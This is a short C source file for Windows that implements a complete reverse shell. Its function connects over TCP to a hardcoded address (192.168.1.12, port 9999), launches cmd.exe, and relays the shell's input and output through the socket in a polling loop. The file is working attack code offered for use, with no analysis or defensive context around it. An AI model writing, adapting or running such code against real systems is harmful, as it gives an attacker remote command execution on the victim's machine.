#include "winsock2.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>

// This sucks
// For some reason mingw can't find these
// defs in the headers.
typedef struct pollfd {
    SOCKET fd;
    short  events;
    short  revents;
} WSAPOLLFD, *PWSAPOLLFD, *LPWSAPOLLFD;

int WSAAPI WSAPoll(
  _Inout_ WSAPOLLFD fdarray[],
  _In_    ULONG     nfds,
  _In_    INT       timeout
);

#define POLLRDNORM 0x0100
#define CMD_MAX 1024

void sc() {
    WSADATA wsaData;
    int res;
    struct sockaddr_in home;
    SOCKET sock;
    STARTUPINFO cmdStartInfo;
    PROCESS_INFORMATION cmdProcInfo;
    char cmdIn[CMD_MAX];
    char cmdOut[CMD_MAX];
    DWORD cmdRead;
    DWORD cmdWrite;
    DWORD bytesWaiting;
    SECURITY_ATTRIBUTES cmdStdAttrs;
    BOOL success;
    HANDLE pipeInRead;
    HANDLE pipeOutWrite;
    HANDLE pipeInWrite;
    HANDLE pipeOutRead;
    COMMTIMEOUTS pipeTimeouts;
    WSAPOLLFD sockPoll[1];
    int emptyCount = 0;

    // Init stuff
    ZeroMemory(&cmdStartInfo, sizeof(cmdStartInfo));
    ZeroMemory(&cmdProcInfo, sizeof(cmdProcInfo));

    cmdStdAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
    cmdStdAttrs.bInheritHandle = TRUE;
    cmdStdAttrs.lpSecurityDescriptor = NULL;

    if (! CreatePipe(&pipeInRead, &pipeInWrite, &cmdStdAttrs, CMD_MAX)) {
        return;
    }
    SetHandleInformation(&pipeInWrite, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&pipeOutRead, &pipeOutWrite, &cmdStdAttrs, CMD_MAX)) {
        return;
    }
    SetHandleInformation(&pipeOutRead, HANDLE_FLAG_INHERIT, 0);

    // We don't want to wait for pipes forever
    pipeTimeouts.ReadIntervalTimeout = 0;
    pipeTimeouts.ReadTotalTimeoutMultiplier = 0;
    pipeTimeouts.WriteTotalTimeoutMultiplier = 0;
    pipeTimeouts.ReadTotalTimeoutConstant = 10;
    pipeTimeouts.WriteTotalTimeoutConstant = 100;
    SetCommTimeouts(pipeOutRead, &pipeTimeouts);
    SetCommTimeouts(pipeOutWrite, &pipeTimeouts);
    SetCommTimeouts(pipeInRead, &pipeTimeouts);
    SetCommTimeouts(pipeInWrite, &pipeTimeouts);

    // Setup addr
    home.sin_family = AF_INET;
    home.sin_port = htons(9999);
    home.sin_addr.s_addr = inet_addr("192.168.1.12");

    // Init winsock2 and connect
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    success = connect(sock, (SOCKADDR *)&home, sizeof(home));

    if (success != 0) {
        return;
    }

    sockPoll[0].fd = sock;
    sockPoll[0].events = POLLRDNORM;
    sockPoll[0].revents = 0;

    // Create a shell to push over the socket
    cmdStartInfo.cb = sizeof(cmdStartInfo);
    cmdStartInfo.hStdInput = pipeInRead;
    cmdStartInfo.hStdOutput = pipeOutWrite;
    cmdStartInfo.hStdError = pipeOutWrite;
    cmdStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    success = CreateProcess("C:\\windows\\system32\\cmd.exe",
            NULL,
            NULL,
            NULL,
            TRUE,
            0,
            NULL,
            NULL,
            &cmdStartInfo,
            &cmdProcInfo);

    if (!success) {
        return;
    }

    for (;;) {
        for (;;) {
            PeekNamedPipe(pipeOutRead, cmdOut, CMD_MAX, &cmdRead, &bytesWaiting, NULL);
            if (bytesWaiting > 0) {
                success = ReadFile(pipeOutRead, cmdOut, CMD_MAX, &cmdRead, NULL);
                if (success) {
                    cmdWrite = send(sock, cmdOut, cmdRead, 0);
                }
            }
            success = WSAPoll(sockPoll, 1, 10);
            if (success == SOCKET_ERROR) {
                return;
            }
            if (success > 0) {
                if (cmdRead = recv(sock, cmdIn, CMD_MAX, 0)) {
                    break;
                } else {
                    if (cmdRead == 0) {
                        return;
                    }
                }
            }
        }
        if (cmdRead > 0) {
            WriteFile(pipeInWrite, cmdIn, cmdRead, &cmdWrite, NULL);
        }
    }

    // Close and cleanup
    res = closesocket(sock);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    sc();
    return 0;
}
